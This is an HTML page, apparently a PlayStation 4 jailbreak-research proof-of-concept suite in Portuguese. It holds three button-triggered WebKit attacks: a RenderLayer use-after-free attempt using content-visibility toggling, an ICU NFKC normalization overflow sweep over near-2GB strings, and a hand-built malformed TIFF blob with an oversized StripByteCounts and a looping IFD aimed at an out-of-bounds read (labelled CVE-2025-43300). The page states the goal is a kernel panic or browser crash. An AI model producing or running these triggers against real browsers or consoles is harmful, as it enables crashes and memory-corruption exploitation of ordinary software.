<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 WebKit Wiki Exploits (12.00+)</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            padding: 20px; 
            background-color: #0d0d0d; 
            color: #00ff00; 
        }
        h1 { 
            color: #fff; 
            border-bottom: 2px solid #333; 
            padding-bottom: 10px; 
            font-size: 1.4em;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        .controls { 
            margin-bottom: 20px; 
            background: #1a1a1a; 
            padding: 20px; 
            border-radius: 8px; 
            border: 1px solid #333; 
        }
        button { 
            display: block; 
            width: 100%; 
            margin: 12px 0; 
            padding: 18px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            background-color: #222; 
            color: #e0e0e0; 
            border: 1px solid #444; 
            border-radius: 4px;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover { 
            background-color: #444; 
            border-color: #fff;
            color: #fff;
        }
        button.danger { 
            background-color: #400; 
            border-color: #800; 
        }
        button.danger:hover { 
            background-color: #800; 
            border-color: #f00; 
        }
        
        #log { 
            height: 400px; 
            border: 1px solid #00ff00; 
            overflow-y: scroll; 
            padding: 15px; 
            background: #000; 
            font-size: 14px; 
            white-space: pre-wrap; 
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }
        
        #testArea {
            visibility: hidden;
            position: absolute;
            top: -9999px;
            left: -9999px;
        }

        .error { color: #ff5555; }
        .highlight { color: #ffff55; font-weight: bold; }
        .success { color: #55ff55; font-weight: bold; }
        .info { color: #aaa; }
    </style>
</head>
<body>
    <div class="container">
        <h1>PS4 Wiki / Github PoC - Test Suite</h1>
        
        <div class="controls">
            <p style="color: #fff; margin-bottom: 15px;">AVISO: Estes testes visam causar um Kernel Panic ou WebKit Crash. O console pode desligar subitamente.</p>
            
            <button class="danger" onclick="test234_RenderLayer_Composited()">Test 234: RenderLayer UAF (Composited)</button>
            <button class="danger" onclick="test235_ICU_GoldenRange()">Test 235: ICU Golden Range (0.313 - 0.316)</button>
            <button class="danger" onclick="test236_TIFF_StripOverflow()">Test 236: TIFF/DNG Strip Overflow</button>
            
            <hr style="border-color: #333; margin: 20px 0;">
            <button onclick="clearLog()">Limpar Log</button>
        </div>

        <div id="log">=== SISTEMA PRONTO ===<br>Aguardando seleção de teste...</div>
    </div>

    <div id="testArea"></div>

    <script>
        const log = document.getElementById('log');
        const testArea = document.getElementById('testArea');

        // Função de Log
        function addLog(msg, type = 'normal') {
            const div = document.createElement('div');
            const time = new Date().toLocaleTimeString();
            div.textContent = `[${time}] ${msg}`;
            
            if (type === 'error') div.className = 'error';
            if (type === 'highlight') div.className = 'highlight';
            if (type === 'success') div.className = 'success';
            if (type === 'info') div.className = 'info';
            
            log.appendChild(div);
            console.log(msg);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            log.innerHTML = '=== LOG LIMPO ===';
            testArea.innerHTML = '';
        }

        // Helper para Garbage Collection (se disponível)
        function forceGC() {
            try {
                if (window.gc) {
                    window.gc();
                } else {
                    // Shim simples para pressão de memória
                    for (let i = 0; i < 100; i++) new ArrayBuffer(1024 * 1024);
                }
            } catch(e) {}
        }

        // =================================================================
        // TESTE 234: RenderLayer UAF (Composited)
        // Baseado na falha de 'content-visibility' em camadas aceleradas por GPU
        // =================================================================
        function test234_RenderLayer_Composited() {
            addLog('>>> INICIANDO TESTE 234: RenderLayer Composited UAF <<<', 'highlight');
            addLog('Estratégia: Forçar "will-change: transform" para criar camada GPU e remover durante "content-visibility: hidden".');
            
            try {
                testArea.innerHTML = ''; // Limpa área
                
                const container = document.createElement('div');
                // Força criação de Composited Layer (Backing Store na GPU)
                container.style.cssText = 'will-change: transform; transform: translateZ(0); width: 100px; height: 100px; background: red; position: relative;';
                
                const child = document.createElement('div');
                child.style.cssText = 'content-visibility: auto; contain: strict; width: 100%; height: 100%;';
                child.innerHTML = '<div style="background:blue; height:2000px">Heavy Content</div>';
                
                container.appendChild(child);
                testArea.appendChild(container); // Anexa ao DOM
                
                // Força renderização inicial (Layout)
                container.offsetHeight;
                
                let frame = 0;
                addLog('Iniciando loop de animação (10 frames)...');

                function step() {
                    if (frame++ > 20) {
                        addLog('Teste concluído sem crash. (Sistema estável ou UAF falhou)', 'success');
                        testArea.innerHTML = '';
                        return;
                    }
                    
                    // 1. Esconde (Destroi backing store lógico, mas mantém layer GPU?)
                    child.style.contentVisibility = 'hidden';
                    
                    // 2. Força layout parcial
                    container.offsetWidth;
                    
                    // 3. Remove do DOM (UAF Potential se a layer composta não for limpa corretamente)
                    if (frame % 2 === 0) {
                        child.remove();
                        // Tenta forçar repaint imediato da área onde ele estava
                        container.style.display = 'none';
                        container.offsetHeight; // Force reflow
                        container.style.display = 'block';
                        
                        // Re-adiciona para o próximo ciclo
                        container.appendChild(child);
                    }
                    
                    // 4. Restaura
                    child.style.contentVisibility = 'visible';
                    requestAnimationFrame(step);
                }
                
                requestAnimationFrame(step);
            } catch(e) {
                addLog('Test 234 Exception: ' + e.message, 'error');
            }
        }

        // =================================================================
        // TESTE 235: ICU Golden Range (0.313 - 0.316)
        // Baseado no Wiki: O overflow acontece numa janela muito específica de tamanho.
        // =================================================================
        function test235_ICU_GoldenRange() {
            addLog('>>> INICIANDO TESTE 235: ICU Golden Range <<<', 'highlight');
            addLog('Varrendo fatores de 0.313 a 0.318 com precisão de 0.001...');
            
            let len = 0x7FFFFFF0;
            let expandChar = "\u00A8"; // Expansão
            let fillChar = "a";
            
            let factor = 0.313; // Início do range
            const max = 0.318;  // Fim do range
            
            async function runStep() {
                if (factor > max) {
                    addLog('Fim do range. Nenhuma falha detectada.', 'success');
                    return;
                }
                
                // Formatação para log
                addLog(`[*] Testando Fator: ${factor.toFixed(4)}...`);
                
                try {
                    forceGC(); // Tenta liberar memória antes da alocação crítica
                    
                    let numExpandChars = 16;
                    let fillLen = len - numExpandChars;
                    
                    // Alocação Crítica
                    // Math.ceil é importante para garantir alinhamento
                    let largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * factor));
                    
                    // Trigger: Normalize NFKC
                    let res = largeStr.normalize('NFKC');
                    
                    // Se o código chegar aqui, não crashou
                    largeStr = null;
                    res = null;
                    addLog(`    -> OK (Sem crash).`);
                    
                    factor += 0.001; // Incremento
                    setTimeout(runStep, 800); // Delay para GC respirar
                    
                } catch(e) {
                    if (e.message.includes("Out of memory")) {
                        addLog(`    -> OOM (Out of Memory) em ${factor.toFixed(4)}.`, 'error');
                        // Se der OOM, tenta de novo com GC forçado ou pula se persistir
                        largeStr = null;
                        forceGC();
                        factor += 0.001;
                        setTimeout(runStep, 1500); // Delay maior após OOM
                    } else {
                        addLog(`    -> Erro Inesperado: ${e.message}`, 'error');
                        factor += 0.001;
                        setTimeout(runStep, 800);
                    }
                }
            }
            
            runStep();
        }

        // =================================================================
        // TESTE 236: TIFF/DNG Strip Overflow (CVE-2025-43300)
        // Cria um arquivo TIFF binário manualmente com StripByteCounts inválido.
        // =================================================================
        function test236_TIFF_StripOverflow() {
            addLog('>>> INICIANDO TESTE 236: TIFF/DNG Strip Overflow <<<', 'highlight');
            addLog('Gerando blob malicioso com StripByteCounts = 0xFFFFFFF0...');
            
            try {
                // Estrutura TIFF Little Endian (II)
                // Cabeçalho básico: 8 bytes
                const buffer = new ArrayBuffer(256);
                const view = new DataView(buffer);
                
                // 0-3: Header (II + 42)
                view.setUint16(0, 0x4949, false); // II (Little Endian)
                view.setUint16(2, 0x002A, true);  // 42
                // 4-7: Offset para o primeiro IFD (0x00000008)
                view.setUint32(4, 0x00000008, true); 
                
                // --- IFD Start (Offset 8) ---
                const numEntries = 2;
                view.setUint16(8, numEntries, true);
                
                // Entry 1: ImageWidth (Tag 0x0100)
                // Offset 10
                view.setUint16(10, 0x0100, true); // Tag
                view.setUint16(12, 0x0004, true); // Type: LONG
                view.setUint32(14, 1, true);      // Count: 1
                view.setUint32(18, 0xFFFFFFFF, true); // Value: Largura Gigante
                
                // Entry 2: StripByteCounts (Tag 0x0117) - O GATILHO
                // Offset 22
                view.setUint16(22, 0x0117, true); // Tag
                view.setUint16(24, 0x0004, true); // Type: LONG
                view.setUint32(26, 1, true);      // Count: 1
                // Value: Tamanho absurdo. O parser vai tentar ler essa qtd de bytes do arquivo.
                // Como o arquivo é pequeno, ele lerá memória heap fora do buffer (OOB Read).
                view.setUint32(30, 0xFFFFFFF0, true); 
                
                // Next IFD Offset (Loop infinito para travar parser?)
                // Aponta para o próprio IFD (Offset 8)
                view.setUint32(34, 0x00000008, true); 
                
                const blob = new Blob([buffer], {type: 'image/tiff'});
                const url = URL.createObjectURL(blob);
                
                const img = document.createElement('img');
                img.style.display = 'none'; // Não precisa ser visível para o parser rodar
                testArea.appendChild(img);
                
                addLog('Imagem carregada no DOM. O parser do WebKit deve processar agora.');
                
                // Gatilho
                img.src = url;
                
                // Monitoramento
                setTimeout(() => {
                    URL.revokeObjectURL(url);
                    addLog('Timeout de 3s atingido.', 'info');
                    addLog('Se o console não travou, o parser tratou a exceção ou ignorou o TIFF.', 'success');
                    if (testArea.contains(img)) testArea.removeChild(img);
                }, 3000);
                
            } catch(e) {
                addLog('Test 236 Exception: ' + e.message, 'error');
            }
        }
    </script>
</body>
</html>
